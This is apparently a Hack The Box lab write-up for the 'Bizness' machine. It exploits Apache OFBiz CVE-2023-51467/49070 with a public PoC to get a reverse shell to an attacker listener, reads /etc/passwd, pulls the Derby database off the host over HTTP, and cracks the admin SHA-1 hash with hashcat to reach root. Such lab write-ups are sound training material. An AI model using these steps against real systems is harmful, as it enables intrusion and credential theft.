# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Bizness]
└─$ nmap -sC -sV -Pn 10.10.11.252 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 18:09 AEST
Nmap scan report for 10.10.11.252
Host is up (0.41s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.65 seconds

```
Add `bizness.htb` to our `/etc/hosts`
# Page check
**bizness.htb**
![](images/Pasted%20image%2020250716182011.png)
Then I would use `ffuf` to enumerate the valid web contents
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Bizness]
└─$ ffuf -u https://bizness.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://bizness.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 1841ms]
index.html              [Status: 200, Size: 27200, Words: 9218, Lines: 523, Duration: 409ms]
:: Progress: [4746/4746] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

Let's check the page of `/control`
![](images/Pasted%20image%2020250716182326.png)
We can find this name of the service `Apache Ofbiz` but it return us the error code `500 Internal error`

So I guess there is another `url` to give us the path to login to the dashboard
I would like use `feroxbuster` to do the more wide enumerating.
```
/partymgr/control
/partymgr
/marketing/control
/marketing
```

Then we can get the redirect to `https://bizness.htb/marketing/control/main` from `/marketing`
![](images/Pasted%20image%2020250716183607.png)
From the bottom of the page, we can get the version of `Apache OFBiz`
`Powered by [Apache OFBiz.](http://ofbiz.apache.org) Release 18.12`

# CVE-2023-51467
Then Let's search its exploits and CVEs:
`CVE-2023-51467 and CVE-2023-49070` would be our target
```
https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
https://github.com/abdoghazy2015/ofbiz-CVE-2023-49070-RCE-POC
This repo is a PoC with to exploit CVE-2023-51467 and CVE-2023-49070 preauth RCE vulnerabilities found in Apache OFBiz.
```

Let's use that exploit script to get the reverse shell
```
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

┌──(wither㉿localhost)-[~/Templates/htb-labs/Bizness/ofbiz-CVE-2023-49070-RCE-POC]
└─$ python3 exploit.py https://bizness.htb/ shell 10.10.14.17:443                       
Not Sure Worked or not 

Remember to open your netcat to handle the reverse shell
```

Then we can get the reverse shell as `ofbiz`

# Privilege Escalation
Firstly, I would like check is there any user to switch
```
ofbiz@bizness:/opt/ofbiz$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ofbiz:x:1001:1001:,,,:/home/ofbiz:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We have been the only one user in this machine, so let's try to find the way to root.

Because we don't have the password of user `ofbiz`, we can't check `sudo -l`.
At the same time, it is very difficult to find the user credentials from the `obfiz` service folder, there are nearly 20,000 files in total. So we need to look for possible database files and config files.

The `OFBiz README.md` says:
```
Note: the default configuration uses an embedded Java database (Apache Derby) and embedded application server components such as Apache Tomcat®, Apache Geronimo (transaction manager), etc.

Derby is a an open source relational database implemented entirely in Java.
```

According to the docs, the database is stored in files in a directory of the same name as the DB:
```
A database directory contains the following, as shown in Figure 2:

log [directory] - Contains files that make up the database transaction log, used internally for data recovery (not the same thing as the error log).

seg0 [directory] - Contains one file for each user table, system table, and index (known as conglomerates).

service.properties [file] - A text file with internal configuration information.

tmp [directory] - (might not exist.) A temporary directory used by Derby for large sorts and deferred updates and deletes. Sorts are used by a variety of SQL statements. For databases on read-only media, you might need to set a property to change the location of this directory. See “Creating Derby Databases for Read-Only Use”.

jar [directory] - (might not exist.) A directory in which jar files are stored when you use database class loading.
```

So `seg0` seems like our target here
```
ofbiz@bizness:~$ find /opt/ofbiz/ -name seg0       
/opt/ofbiz/runtime/data/derby/ofbiz/seg0
/opt/ofbiz/runtime/data/derby/ofbizolap/seg0
/opt/ofbiz/runtime/data/derby/ofbiztenant/seg0
```

There are also professional tools here to help us view the database
```
ij is an “interactive SQL scripting tool that comes with Derby”, according to the docs. I’ll install it with apt install derby-tools.
```

Firstly, we need to compress all of them into one file and download to our local machine
```
ofbiz@bizness:~$ tar -czf /tmp/derby.tar.gz /opt/ofbiz/runtime/data/derby

ofbiz@bizness:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(wither㉿localhost)-[~/Templates/htb-labs/Bizness]
└─$ wget http://10.10.11.252:8000/derby.tar.gz
```

Then we can unzip it and check the database
```
ij version 10.14
ij> connect 'jdbc:derby:./ofbiz';
ij>

ij> show SCHEMAS;
TABLE_SCHEM                   
------------------------------
APP                           
NULLID                        
OFBIZ                         
SQLJ                          
SYS                           
SYSCAT                        
SYSCS_DIAG                    
SYSCS_UTIL                    
SYSFUN                        
SYSIBM                        
SYSPROC                       
SYSSTAT                       

12 rows selected

ij> show tables;
```

There’s a few interesting ones that look like they might have hashes:
```
OFBIZ               |USER_LOGIN                    |                    
OFBIZ               |USER_LOGIN_HISTORY            |                    
OFBIZ               |USER_LOGIN_PASSWORD_HISTORY   |                    
OFBIZ               |USER_LOGIN_SECURITY_GROUP     |                    
OFBIZ               |USER_LOGIN_SECURITY_QUESTION  |                    
OFBIZ               |USER_LOGIN_SESSION            |    
```

Then we can check the structure of table `USER_LOGIN`
```
ij> describe OFBIZ.USER_LOGIN;
COLUMN_NAME         |TYPE_NAME|DEC&|NUM&|COLUM&|COLUMN_DEF|CHAR_OCTE&|IS_NULL&
------------------------------------------------------------------------------
USER_LOGIN_ID       |VARCHAR  |NULL|NULL|255   |NULL      |510       |NO      
CURRENT_PASSWORD    |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
PASSWORD_HINT       |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
IS_SYSTEM           |CHAR     |NULL|NULL|1     |NULL      |2         |YES     
ENABLED             |CHAR     |NULL|NULL|1     |NULL      |2         |YES     
HAS_LOGGED_OUT      |CHAR     |NULL|NULL|1     |NULL      |2         |YES     
REQUIRE_PASSWORD_CH&|CHAR     |NULL|NULL|1     |NULL      |2         |YES     
LAST_CURRENCY_UOM   |VARCHAR  |NULL|NULL|20    |NULL      |40        |YES     
LAST_LOCALE         |VARCHAR  |NULL|NULL|10    |NULL      |20        |YES     
LAST_TIME_ZONE      |VARCHAR  |NULL|NULL|60    |NULL      |120       |YES     
DISABLED_DATE_TIME  |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
SUCCESSIVE_FAILED_L&|NUMERIC  |0   |10  |20    |NULL      |NULL      |YES     
EXTERNAL_AUTH_ID    |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
USER_LDAP_DN        |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
DISABLED_BY         |VARCHAR  |NULL|NULL|255   |NULL      |510       |YES     
LAST_UPDATED_STAMP  |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
LAST_UPDATED_TX_STA&|TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
CREATED_STAMP       |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
CREATED_TX_STAMP    |TIMESTAMP|9   |10  |29    |NULL      |NULL      |YES     
PARTY_ID            |VARCHAR  |NULL|NULL|20    |NULL      |40        |YES     

20 rows selected
```

We are more interested in `USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT`
So let's only check them 
```
ij> select USER_LOGIN_ID, CURRENT_PASSWORD, PASSWORD_HINT from OFBIZ.USER_LOGIN;
USER_LOGIN_ID                                                                                                                   |CURRENT_PASSWORD                                                                                                                |PASSWORD_HINT                                                                                                                   
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
system                                                                                                                          |NULL                                                                                                                            |NULL                                                                                                                            
anonymous                                                                                                                       |NULL                                                                                                                            |NULL                                                                                                                            
admin                                                                                                                           |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I                                                                                              |NULL                                                                                                                            

3 rows selected

```

So I guess we can try to crack this hash `admin:$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Bizness]
└─$ john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)

```
It told me there is no valid hash, so I guess it has been encoded by some format, so I would try it in `cyberchef`
Let's analysis it:
```
uP0_QaVBpDWFeo8-dRzDqRwXQ2I
This is the most critical part, the actual hash value, usually:

The result of base64 encoding (this string also meets the character set of Base64 URL-safe variant)

After decoding, it may be: hash, or salt + hash
```
If I just `from Base64` and `To Hex`, we can only get the length of 36 byte, that's not the length of `SHA-1` or any others
![](images/Pasted%20image%2020250716192907.png)
Then let's strict the rule `A-Za-z0-9-_`
If I look at the last section of my hash, it is `base64-encoded` (URL-safe alphabet based on the “_”), which decodes to 20 bytes (40 hex characters):
![](images/Pasted%20image%2020250716192027.png)
The length is 40 bytes (`SHA-1`)

Then let's try to crack it again `b8fd3f41a541a435857a8f3e751cc3a91c174362:d`
(`d` is the salt of hash)
```
hashcat admin_model.hash -m 120 /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Wed Jul 16 19:23:14 2025 (1 sec)
Time.Estimated...: Wed Jul 16 19:23:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4444.7 kH/s (0.05ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1478656/14344385 (10.31%)
Rejected.........: 0/1478656 (0.00%)
Restore.Point....: 1478144/14344385 (10.30%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: monky1994 -> monkey-moo
Hardware.Mon.#1..: Util: 52%

Started: Wed Jul 16 19:23:07 2025
Stopped: Wed Jul 16 19:23:16 2025

```

Then we can successfully get the credit of admin `admin:monkeybizness`

Then you can successfully `su root` with this credit here.

# Description

For this machine, its foothold is very simple. It is only necessary to pay attention to the use of a more comprehensive dictionary when using directory enumeration tools, otherwise sometimes we cannot find what we need.

For privilege escalation, when we enumerate very large file directories, we must know the files and data we want. For the decryption part, it is mainly necessary to know the various common encoding formats, at least to be able to guess the possible options.

